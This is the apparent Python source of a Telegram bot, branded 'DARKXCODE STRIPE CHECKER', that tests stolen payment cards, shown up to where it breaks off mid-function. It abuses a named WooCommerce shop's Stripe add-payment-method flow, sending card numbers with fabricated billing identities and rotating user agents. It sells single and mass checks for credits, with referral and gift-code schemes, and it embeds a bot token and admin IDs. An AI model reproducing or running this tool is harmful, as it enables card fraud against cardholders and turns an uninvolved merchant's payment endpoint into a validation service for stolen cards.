import asyncio
import json
import random
import datetime
import time
import os
import re
import aiohttp
import string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from telegram.constants import ParseMode
from telegram.error import NetworkError, BadRequest, TimedOut
import logging
from telegram.helpers import escape_markdown
import asyncpg

# Add this function to properly escape markdown
def escape_markdown_v2(text):
    """Escape markdown v2 special characters"""
    if not text:
        return text
    escape_chars = '_*[]()~`>#+-=|{}.!'
    for char in escape_chars:
        text = text.replace(char, f'\\{char}')
    return text

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot configuration
BOT_TOKEN = "8163640062:AAFJm_0bYqBZTGFXHB7FlfJOC-PZVaFJ9Z4"
ADMIN_IDS = [8079395886]  # Your Telegram ID
CHANNEL_LINK = "https://t.me/+zsK6NPGgvSc4NzM1"  # Your private channel link

# Database configuration
DATABASE_URL = "postgresql://postgres:[YOUR-PASSWORD]@db.bipzipmraeyjirghdlbm.supabase.co:5432/postgres"  # Update with your Supabase credentials

# Stripe configuration
DOMAIN = "https://dainte.com"
PK = "pk_live_51F0CDkINGBagf8ROVbhXA43bHPn9cGEHEO55TN2mfNGYsbv2DAPuv6K0LoVywNJKNuzFZ4xGw94nVElyYg1Aniaf00QDrdzPhf"

# Bot info
BOT_INFO = {
    "name": "⚡ DARKXCODE STRIPE CHECKER ⚡",
    "version": "v4.0",
    "creator": "@DarkXCode",
    "gates": "Stripe (dainte.com)",
    "features": "• Ultra-Fast Single Check\n• Mass Check with Live Results\n• Gift Code System\n• Advanced Admin Panel\n• Real-time Statistics\n• Invite & Earn System"
}

# User-Agent rotation list
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
]

# Billing addresses for different card locations
BILLING_ADDRESSES = {
    "US": [
        {"name": "John Smith", "postal_code": "10001", "city": "New York", "state": "NY", "country": "US"},
        {"name": "Michael Johnson", "postal_code": "90210", "city": "Beverly Hills", "state": "CA", "country": "US"},
        {"name": "Robert Williams", "postal_code": "33101", "city": "Miami", "state": "FL", "country": "US"},
        {"name": "James Brown", "postal_code": "60601", "city": "Chicago", "state": "IL", "country": "US"},
        {"name": "David Miller", "postal_code": "75201", "city": "Dallas", "state": "TX", "country": "US"}
    ],
    "UK": [
        {"name": "James Wilson", "postal_code": "SW1A 1AA", "city": "London", "state": "England", "country": "GB"},
        {"name": "Thomas Brown", "postal_code": "M1 1AA", "city": "Manchester", "state": "England", "country": "GB"},
        {"name": "William Taylor", "postal_code": "B1 1AA", "city": "Birmingham", "state": "England", "country": "GB"}
    ],
    "CA": [
        {"name": "Christopher Lee", "postal_code": "M5H 2N2", "city": "Toronto", "state": "ON", "country": "CA"},
        {"name": "Matthew Martin", "postal_code": "H3B 2Y5", "city": "Montreal", "state": "QC", "country": "CA"},
        {"name": "Daniel Thompson", "postal_code": "V6B 2Y5", "city": "Vancouver", "state": "BC", "country": "CA"}
    ],
    "IN": [
        {"name": "Rajesh Kumar", "postal_code": "110001", "city": "New Delhi", "state": "Delhi", "country": "IN"},
        {"name": "Amit Sharma", "postal_code": "400001", "city": "Mumbai", "state": "Maharashtra", "country": "IN"},
        {"name": "Priya Patel", "postal_code": "560001", "city": "Bangalore", "state": "Karnataka", "country": "IN"},
        {"name": "Suresh Reddy", "postal_code": "500001", "city": "Hyderabad", "state": "Telangana", "country": "IN"},
        {"name": "Anjali Singh", "postal_code": "700001", "city": "Kolkata", "state": "West Bengal", "country": "IN"},
        {"name": "Vikram Joshi", "postal_code": "380001", "city": "Ahmedabad", "state": "Gujarat", "country": "IN"},
        {"name": "Neha Gupta", "postal_code": "302001", "city": "Jaipur", "state": "Rajasthan", "country": "IN"},
        {"name": "Rahul Verma", "postal_code": "226001", "city": "Lucknow", "state": "Uttar Pradesh", "country": "IN"},
        {"name": "Sunita Desai", "postal_code": "411001", "city": "Pune", "state": "Maharashtra", "country": "IN"},
        {"name": "Arun Mehta", "postal_code": "600001", "city": "Chennai", "state": "Tamil Nadu", "country": "IN"}
    ],
    "AU": [
        {"name": "John Smith", "postal_code": "2000", "city": "Sydney", "state": "NSW", "country": "AU"},
        {"name": "Sarah Johnson", "postal_code": "3000", "city": "Melbourne", "state": "VIC", "country": "AU"},
        {"name": "Michael Brown", "postal_code": "4000", "city": "Brisbane", "state": "QLD", "country": "AU"}
    ]
}

# Database connection pool
db_pool = None

async def init_database():
    """Initialize database connection"""
    global db_pool
    try:
        db_pool = await asyncpg.create_pool(DATABASE_URL, min_size=1, max_size=10)
        logger.info("Database connection established")
        
        # Create tables if they don't exist
        async with db_pool.acquire() as conn:
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id BIGINT PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    joined_date TIMESTAMP DEFAULT NOW(),
                    last_active TIMESTAMP DEFAULT NOW(),
                    credits INTEGER DEFAULT 0,
                    credits_spent INTEGER DEFAULT 0,
                    total_checks INTEGER DEFAULT 0,
                    approved_cards INTEGER DEFAULT 0,
                    declined_cards INTEGER DEFAULT 0,
                    checks_today INTEGER DEFAULT 0,
                    last_check_date DATE,
                    joined_channel BOOLEAN DEFAULT FALSE,
                    referrer_id BIGINT,
                    referrals_count INTEGER DEFAULT 0,
                    earned_from_referrals INTEGER DEFAULT 0
                )
            ''')
            
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS gift_codes (
                    code TEXT PRIMARY KEY,
                    credits INTEGER NOT NULL,
                    max_uses INTEGER,
                    uses INTEGER DEFAULT 0,
                    created_at TIMESTAMP DEFAULT NOW(),
                    created_by BIGINT,
                    claimed_by TEXT[] DEFAULT '{}'
                )
            ''')
            
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS user_claimed_codes (
                    user_id BIGINT,
                    code TEXT,
                    claimed_at TIMESTAMP DEFAULT NOW(),
                    PRIMARY KEY (user_id, code)
                )
            ''')
            
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS bot_statistics (
                    id SERIAL PRIMARY KEY,
                    total_checks INTEGER DEFAULT 0,
                    total_approved INTEGER DEFAULT 0,
                    total_declined INTEGER DEFAULT 0,
                    total_credits_used INTEGER DEFAULT 0,
                    total_users INTEGER DEFAULT 0,
                    start_time TIMESTAMP DEFAULT NOW()
                )
            ''')
            
            # Initialize bot statistics if not exists
            await conn.execute('''
                INSERT INTO bot_statistics (id) VALUES (1)
                ON CONFLICT (id) DO NOTHING
            ''')
            
            logger.info("Database tables created/verified")
            
    except Exception as e:
        logger.error(f"Database initialization error: {e}")
        raise

async def get_user(user_id):
    """Get user from database"""
    async with db_pool.acquire() as conn:
        user = await conn.fetchrow('SELECT * FROM users WHERE user_id = $1', user_id)
        if not user:
            # Create new user
            await conn.execute('''
                INSERT INTO users (user_id, joined_date, last_active)
                VALUES ($1, NOW(), NOW())
            ''', user_id)
            # Increment total users in statistics
            await conn.execute('''
                UPDATE bot_statistics 
                SET total_users = total_users + 1 
                WHERE id = 1
            ''')
            # Fetch the newly created user
            user = await conn.fetchrow('SELECT * FROM users WHERE user_id = $1', user_id)
        return user

async def update_user(user_id, updates):
    """Update user data in database"""
    async with db_pool.acquire() as conn:
        set_clause = ', '.join([f"{k} = ${i+2}" for i, k in enumerate(updates.keys())])
        values = [user_id] + list(updates.values())
        query = f'UPDATE users SET {set_clause}, last_active = NOW() WHERE user_id = $1'
        await conn.execute(query, *values)

async def get_bot_stats():
    """Get bot statistics from database"""
    async with db_pool.acquire() as conn:
        stats = await conn.fetchrow('SELECT * FROM bot_statistics WHERE id = 1')
        return stats

async def update_bot_stats(updates):
    """Update bot statistics"""
    async with db_pool.acquire() as conn:
        set_clause = ', '.join([f"{k} = {k} + ${i+1}" for i, k in enumerate(updates.keys())])
        values = list(updates.values())
        query = f'UPDATE bot_statistics SET {set_clause} WHERE id = 1'
        await conn.execute(query, *values)

async def create_gift_code(code, credits, max_uses, created_by):
    """Create a gift code in database"""
    async with db_pool.acquire() as conn:
        await conn.execute('''
            INSERT INTO gift_codes (code, credits, max_uses, created_by)
            VALUES ($1, $2, $3, $4)
        ''', code, credits, max_uses, created_by)

async def get_gift_code(code):
    """Get gift code from database"""
    async with db_pool.acquire() as conn:
        return await conn.fetchrow('SELECT * FROM gift_codes WHERE code = $1', code)

async def update_gift_code_usage(code, user_id):
    """Update gift code usage"""
    async with db_pool.acquire() as conn:
        await conn.execute('''
            UPDATE gift_codes 
            SET uses = uses + 1, claimed_by = array_append(claimed_by, $2::text)
            WHERE code = $1
        ''', code, str(user_id))
        
        await conn.execute('''
            INSERT INTO user_claimed_codes (user_id, code)
            VALUES ($1, $2)
            ON CONFLICT (user_id, code) DO NOTHING
        ''', user_id, code)

async def get_all_gift_codes():
    """Get all gift codes"""
    async with db_pool.acquire() as conn:
        return await conn.fetch('SELECT * FROM gift_codes ORDER BY created_at DESC')

def parseX(data, start, end):
    try:
        if not data or not start or not end:
            return None
        if start not in data:
            return None
        star = data.index(start) + len(start)
        if end not in data[star:]:
            return None
        last = data.index(end, star)
        return data[star:last]
    except (ValueError, TypeError, AttributeError):
        return None

def generate_gift_code(length=16):
    """Generate a random gift code"""
    characters = string.ascii_uppercase + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def get_billing_address(card_bin=""):
    """Get random billing address based on card BIN or random country"""
    # Default to US if no BIN or unknown BIN
    if not card_bin or len(card_bin) < 6:
        country = random.choice(list(BILLING_ADDRESSES.keys()))
    else:
        # Simple BIN to country mapping
        bin_prefix = card_bin[:2]
        if bin_prefix in ["40", "41", "42", "43", "44", "45", "46", "47", "48", "49"]:
            country = "US"  # Visa
        elif bin_prefix in ["51", "52", "53", "54", "55"]:
            country = "US"  # Mastercard
        elif bin_prefix in ["34", "37"]:
            country = "US"  # Amex
        elif bin_prefix in ["60", "65"]:
            country = "IN"  # RuPay (India)
        elif bin_prefix in ["35"]:
            country = "JP"  # JCB
        elif bin_prefix in ["30", "36", "38", "39"]:
            country = "US"  # Diners Club
        else:
            country = random.choice(list(BILLING_ADDRESSES.keys()))
    
    return random.choice(BILLING_ADDRESSES[country])

# In-memory cache for checking tasks (temporary storage)
checking_tasks = {}
files_storage = {}
setup_intent_cache = {}
last_cache_time = 0

async def get_setup_intent():
    """Get setup intent nonce with caching"""
    global setup_intent_cache, last_cache_time
    
    current_time = time.time()
    
    # Check cache (5 minutes)
    if "nonce" in setup_intent_cache and current_time - last_cache_time < 300:
        return setup_intent_cache["nonce"], setup_intent_cache["session"]
    
    # Get fresh setup intent
    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=10)
    
    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "user-agent": random.choice(USER_AGENTS),
            }
            
            async with session.get(f"{DOMAIN}/my-account/add-payment-method/", headers=headers, timeout=10) as response:
                if response.status != 200:
                    return None, None
                
                html = await response.text()
                nonce = parseX(html, '"createAndConfirmSetupIntentNonce":"', '"')
                
                if nonce and len(nonce) > 10:
                    setup_intent_cache = {
                        "nonce": nonce,
                        "session": session,
                        "timestamp": current_time
                    }
                    last_cache_time = current_time
                    return nonce, session
    
    except Exception as e:
        logger.error(f"Error getting setup intent: {e}")
    
    return None, None

# ==================== CALLBACK HANDLERS ====================

async def back_to_start_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle back to start callback"""
    query = update.callback_query
    
    try:
        await query.answer()
    except BadRequest:
        pass
    
    # Create a fake update object to call start_command
    fake_update = Update(
        update_id=update.update_id,
        message=query.message,
        callback_query=query
    )
    await start_command(fake_update, context)

async def quick_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle quick check callback"""
    query = update.callback_query
    
    try:
        await query.answer("Use /chk cc|mm|yy|cvv to check a card")
    except BadRequest:
        pass
    
    await query.edit_message_text(
        "*⚡ QUICK CARD CHECK*\n"
        "══════════════════════\n"
        "To check a card, use:\n"
        "`/chk cc|mm|yy|cvv`\n\n"
        "*Example:*\n"
        "`/chk 4111111111111111|12|2025|123`\n\n"
        "*Features:*\n"
        "• ⚡ Instant results\n"
        "• Cost: 1 credit\n"
        "• Speed: Instant\n\n"
        "*Try it now!*",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]])
    )

async def admin_addcr_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin add credits callback"""
    query = update.callback_query
    
    try:
        await query.answer("Use /addcr user_id amount")
    except BadRequest:
        pass
    
    await query.edit_message_text(
        "*➕ ADD CREDITS*\n"
        "══════════════════════\n"
        "To add credits to a user, use:\n"
        "`/addcr user_id amount`\n\n"
        "*Example:*\n"
        "`/addcr 123456789 100`\n\n"
        "This will add 100 credits to user 123456789.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]])
    )

async def admin_gengift_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin generate gift callback"""
    query = update.callback_query
    
    try:
        await query.answer("Use /gengift credits max_uses")
    except BadRequest:
        pass
    
    await query.edit_message_text(
        "*🎁 GENERATE GIFT CODE*\n"
        "══════════════════════\n"
        "To generate a gift code, use:\n"
        "`/gengift credits max_uses`\n\n"
        "*Example:*\n"
        "`/gengift 50 10`\n\n"
        "This creates a code worth 50 credits, usable 10 times.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]])
    )

async def admin_listgifts_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin list gifts callback"""
    query = update.callback_query
    
    try:
        await query.answer()
    except BadRequest:
        pass
    
    # Call the actual command
    fake_update = Update(
        update_id=update.update_id,
        message=query.message,
        callback_query=query
    )
    await listgifts_command(fake_update, context)

async def admin_userinfo_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin user info callback"""
    query = update.callback_query
    
    try:
        await query.answer("Use /userinfo user_id")
    except BadRequest:
        pass
    
    await query.edit_message_text(
        "*👤 USER INFORMATION*\n"
        "══════════════════════\n"
        "To view user information, use:\n"
        "`/userinfo user_id`\n\n"
        "*Example:*\n"
        "`/userinfo 123456789`\n\n"
        "This will show detailed info about the user.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]])
    )

async def admin_botinfo_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin bot info callback"""
    query = update.callback_query
    
    try:
        await query.answer()
    except BadRequest:
        pass
    
    # Call the actual command
    fake_update = Update(
        update_id=update.update_id,
        message=query.message,
        callback_query=query
    )
    await botinfo_command(fake_update, context)

async def my_credits_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle my credits callback"""
    query = update.callback_query
    
    try:
        await query.answer()
    except BadRequest:
        pass
    
    user_id = query.from_user.id
    user = await get_user(user_id)
    
    await query.edit_message_text(
        f"*💰 YOUR CREDITS*\n"
        f"══════════════════════\n"
        f"*Available Credits:* {user['credits']}\n"
        f"*Credits Spent:* {user.get('credits_spent', 0)}\n\n"
        f"*Credit Usage:*\n"
        f"• Single check: 1 credit\n"
        f"• Mass check: 1 credit per card\n\n"
        f"*Get More Credits:*\n"
        f"1. Ask admin for credits\n"
        f"2. Claim gift codes with /claim\n"
        f"3. Invite friends and earn 50 credits each\n"
        f"4. Wait for promotions\n\n"
        f"*Note:* Credits are deducted for all check attempts.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]])
    )

async def invite_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle invite callback"""
    query = update.callback_query
    
    try:
        await query.answer()
    except BadRequest:
        pass
    
    user_id = query.from_user.id
    
    # Generate invite link
    bot_username = (await context.bot.get_me()).username
    invite_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
    
    await query.edit_message_text(
        f"*🤝 INVITE & EARN*\n"
        f"══════════════════════\n"
        f"*Your Invite Link:*\n"
        f"`{invite_link}`\n\n"
        f"*How it works:*\n"
        f"1. Share your invite link with friends\n"
        f"2. When they join using your link:\n"
        f"   • You get 50 credits\n"
        f"   • They get 10 credits\n"
        f"3. Earn unlimited credits!\n\n"
        f"*Your Referrals:* {0}\n"  # We'll add this later
        f"*Earned from Referrals:* {0} credits\n\n"  # We'll add this later
        f"*Copy and share your link now!*",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📋 Copy Link", callback_data="copy_invite")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]
        ])
    )

async def copy_invite_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle copy invite callback"""
    query = update.callback_query
    
    try:
        await query.answer("Invite link copied to your message input!")
    except BadRequest:
        pass
    
    # This will show the link in the message input field
    user_id = query.from_user.id
    bot_username = (await context.bot.get_me()).username
    invite_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
    
    await query.edit_message_text(
        f"*📋 INVITE LINK*\n"
        f"══════════════════════\n"
        f"Copy this link and share with friends:\n\n"
        f"`{invite_link}`\n\n"
        f"*Already copied to your message input!*",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="invite")]])
    )

async def admin_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin panel callback"""
    query = update.callback_query
    
    try:
        await query.answer()
    except BadRequest:
        pass
    
    user_id = query.from_user.id
    
    if user_id not in ADMIN_IDS:
        await query.answer("❌ Admin only!", show_alert=True)
        return
    
    keyboard = [
        [InlineKeyboardButton("➕ Add Credits", callback_data="admin_addcr"),
         InlineKeyboardButton("🎁 Generate Gift", callback_data="admin_gengift")],
        [InlineKeyboardButton("📋 List Gifts", callback_data="admin_listgifts"),
         InlineKeyboardButton("👤 User Info", callback_data="admin_userinfo")],
        [InlineKeyboardButton("📊 Bot Stats", callback_data="admin_botinfo"),
         InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_start")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "*👑 ADMIN PANEL*\n"
        "══════════════════════\n"
        "*Available Commands:*\n"
        "• `/addcr user_id amount` - Add credits\n"
        "• `/gengift credits max_uses` - Create gift code\n"
        "• `/listgifts` - List all gift codes\n"
        "• `/userinfo user_id` - View user info\n"
        "• `/botinfo` - Bot statistics\n\n"
        "*Quick Actions:* (Use buttons below)",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def check_single_card_fast(card):
    """Ultra-fast card checking with address rotation"""
    try:
        cc, mon, year, cvv = card.split("|")
        year = year[-2:] if len(year) == 4 else year
        cc_clean = cc.replace(" ", "")
        
        # Get billing address based on card BIN
        billing_address = get_billing_address(cc_clean[:6])
        
        # Get setup intent (cached)
        setup_intent_nonce, session = await get_setup_intent()
        if not setup_intent_nonce or not session:
            return card, "declined", "Setup error", 0
        
        # Step 1: Create payment method with Stripe (FAST)
        headers1 = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": random.choice(USER_AGENTS),
        }
        
        data1 = {
            "type": "card",
            "card[number]": cc_clean,
            "card[cvc]": cvv,
            "card[exp_year]": year,
            "card[exp_month]": mon,
            "allow_redisplay": "unspecified",
            "billing_details[address][postal_code]": billing_address["postal_code"],
            "billing_details[address][country]": billing_address["country"],
            "billing_details[address][city]": billing_address["city"],
            "billing_details[address][state]": billing_address["state"],
            "billing_details[name]": billing_address["name"],
            "key": PK,
            "_stripe_version": "2024-06-20",
        }
        
        try:
            async with session.post("https://api.stripe.com/v1/payment_methods", headers=headers1, data=data1, timeout=5) as response:
                if response.status == 200:
                    req1 = await response.text()
                else:
                    return card, "declined", f"Stripe HTTP {response.status}", response.status
        except asyncio.TimeoutError:
            return card, "declined", "Stripe timeout", 0
        except Exception:
            return card, "declined", "Stripe error", 0
        
        try:
            pm_data = json.loads(req1)
            if 'error' in pm_data:
                error_msg = pm_data['error'].get('message', 'Stripe error')
                return card, "declined", f"Stripe: {error_msg[:25]}", pm_data['error'].get('code', 0)
            
            pmid = pm_data.get('id')
            if not pmid:
                return card, "declined", "No payment ID", 0
        except json.JSONDecodeError:
            return card, "declined", "Invalid response", 0
        
        # Step 2: Send to WooCommerce (FAST)
        headers2 = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": DOMAIN,
            "referer": f"{DOMAIN}/my-account/add-payment-method/",
            "user-agent": random.choice(USER_AGENTS),
            "x-requested-with": "XMLHttpRequest",
        }
        
        data2 = {
            "action": "wc_stripe_create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pmid,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": setup_intent_nonce,
        }
        
        try:
            async with session.post(f"{DOMAIN}/wp-admin/admin-ajax.php", headers=headers2, data=data2, timeout=5) as response:
                if response.status == 200:
                    req2 = await response.text()
                else:
                    return card, "declined", f"AJAX HTTP {response.status}", response.status
        except asyncio.TimeoutError:
            return card, "declined", "AJAX timeout", 0
        except Exception:
            return card, "declined", "AJAX error", 0
        
        try:
            result_data = json.loads(req2)
            if isinstance(result_data, dict) and result_data.get('success'):
                return card, "approved", "✅ Approved", 200
            else:
                error_msg = "Declined"
                if isinstance(result_data, dict):
                    if 'data' in result_data and isinstance(result_data['data'], dict):
                        if 'error' in result_data['data']:
                            error_obj = result_data['data']['error']
                            if isinstance(error_obj, dict):
                                error_msg = error_obj.get('message', 'Declined')
                return card, "declined", error_msg[:25], 0
        except json.JSONDecodeError:
            return card, "declined", "Invalid JSON", 0
                
    except ValueError:
        return card, "declined", "Invalid format", 0
    except Exception as e:
        return card, "declined", f"Error: {str(e)[:20]}", 0

async def mass_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle mass check callback"""
    query = update.callback_query
    
    try:
        await query.answer()
    except BadRequest:
        pass
    
    await query.edit_message_text(
        "*📊 MASS CHECK SYSTEM*\n"
        "══════════════════════\n"
        "To start a mass check:\n"
        "1. Upload a .txt file with cards\n"
        "2. Use `/mchk` command\n\n"
        "*Format in file:*\n"
        "`cc|mm|yy|cvv`\n"
        "`cc|mm|yy|cvv`\n"
        "...\n\n"
        "*Features:*\n"
        "• ⚡ 5 cards/second speed\n"
        "• Live real-time results\n"
        "• Cancel anytime with /cancel\n"
        "• Credits deducted per card\n\n"
        "*Try it now!* Upload a .txt file and use `/mchk`",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]])
    )

def format_card_result(card, status, message, credits_left=None, user_stats=None):
    """Format card checking result with advanced styling"""
    try:
        cc, mon, year, cvv = card.split("|")
        masked_card = f"{cc[:6]}******{cc[-4:]}"
    except:
        return f"❌ *Invalid card format*: `{card}`"
    
    if status == "approved":
        emoji = "✅"
        color = "🟢"
        status_text = "APPROVED"
    else:
        emoji = "❌"
        color = "🔴"
        status_text = "DECLINED"
    
    result = f"""
{color} *{status_text}* {color}
══════════════════════
*Card:* `{masked_card}`
*Expiry:* {mon}/{year}
*CVV:* `{cvv}`
*Status:* {emoji} {status_text}
*Response:* {message}
══════════════════════
"""
    
    if credits_left is not None:
        result += f"*Credits Left:* {credits_left}\n"
    
    if user_stats:
        result += f"*Today:* ✅{user_stats['approved']} ❌{user_stats['declined']}\n"
        result += f"*Total:* ✅{user_stats['total_approved']} ❌{user_stats['total_declined']}\n"
    
    result += "══════════════════════"
    return result

# ==================== COMMAND HANDLERS ====================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command with referral system"""
    # Determine if this is from message or callback
    if update.message:
        message = update.message
        user_id = update.effective_user.id
        user_name = update.effective_user.first_name or ""
        username = update.effective_user.username or ""
    elif update.callback_query:
        message = update.callback_query.message
        user_id = update.callback_query.from_user.id
        user_name = update.callback_query.from_user.first_name or ""
        username = update.callback_query.from_user.username or ""
    else:
        return
    
    # Check for referral parameter
    referrer_id = None
    if context.args and context.args[0].startswith('ref_'):
        try:
            referrer_id = int(context.args[0].replace('ref_', ''))
        except ValueError:
            referrer_id = None
    
    user = await get_user(user_id)
    
    # Update user info if needed
    updates = {}
    if user['username'] != username:
        updates['username'] = username
    if user['first_name'] != user_name:
        updates['first_name'] = user_name
    
    # Handle referral if it's a new user with referrer
    if referrer_id and referrer_id != user_id and not user['referrer_id']:
        updates['referrer_id'] = referrer_id
        
        # Add credits to new user
        updates['credits'] = user['credits'] + 10
        
        # Update referrer's credits
        async with db_pool.acquire() as conn:
            await conn.execute('''
                UPDATE users 
                SET credits = credits + 50, 
                    referrals_count = referrals_count + 1,
                    earned_from_referrals = earned_from_referrals + 50
                WHERE user_id = $1
            ''', referrer_id)
    
    if updates:
        await update_user(user_id, updates)
        user = await get_user(user_id)  # Refresh user data
    
    # Check channel membership
    if not user['joined_channel']:
        keyboard = [
            [InlineKeyboardButton("✅ Join Private Channel", url=CHANNEL_LINK)],
            [InlineKeyboardButton("🔄 Verify Join", callback_data="verify_join")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await message.reply_text(
            f"*🔒 PRIVATE CHANNEL ACCESS REQUIRED*\n"
            f"══════════════════════\n"
            f"To access {BOT_INFO['name']}, you must join our private channel.\n\n"
            f"**Steps:**\n"
            f"1. Click 'Join Private Channel'\n"
            f"2. Wait for admin approval\n"
            f"3. Click 'Verify Join'\n\n"
            f"*Note:* Private channel requires manual approval.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )
        return
    
    # User has joined channel
    await update_user(user_id, {'joined_channel': True})
    
    # Check if user is admin
    is_admin = user_id in ADMIN_IDS
    
    # Check if user came from referral
    referral_bonus_text = ""
    if user['referrer_id']:
        referral_bonus_text = f"🎁 *Referral Bonus:* +10 credits (from invitation)\n"
    
    # Prepare welcome message
    welcome_text = f"""*{BOT_INFO['name']}*
══════════════════════
👋 *Welcome, {user_name or 'User'}!*

*Account Overview:*
• Credits: *{user['credits']}*
• Today: ✅{user.get('approved_cards', 0)} ❌{user.get('declined_cards', 0)}
• Total Checks: *{user['total_checks']}*
{referral_bonus_text}
*User Commands:*
• `/chk cc|mm|yy|cvv` - Check single card
• `/mchk` - Upload file for mass check
• `/credits` - Check balance
• `/claim CODE` - Redeem gift code
• `/info` - Bot information
• `/invite` - Invite friends & earn credits
• `/cancel` - Cancel mass check
• `/help` - This help
"""
    
    # Add admin commands if user is admin
    if is_admin:
        welcome_text += """
*Admin Commands:*
• `/addcr user_id amount` - Add credits
• `/gengift credits max_uses` - Create gift code
• `/listgifts` - List all gift codes
• `/userinfo user_id` - View user info
• `/botinfo` - Bot statistics
"""
    
    welcome_text += """
*Owner:* 👑 @ISHANT_OFFICIAL
══════════════════════
"""
    
    # Add navigation buttons
    keyboard = [
        [InlineKeyboardButton("⚡ Check Card", callback_data="quick_check")],
        [InlineKeyboardButton("📊 Mass Check", callback_data="mass_check")],
        [InlineKeyboardButton("💰 My Credits", callback_data="my_credits"),
         InlineKeyboardButton("🤝 Invite & Earn", callback_data="invite")]
    ]
    
    # Add admin panel button for admins
    if is_admin:
        keyboard.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await message.reply_text(
        welcome_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /info command - Shows public bot info"""
    user_id = update.effective_user.id
    
    # Get user stats for display
    user = await get_user(user_id)
    is_admin = user_id in ADMIN_IDS
    
    # Prepare info message
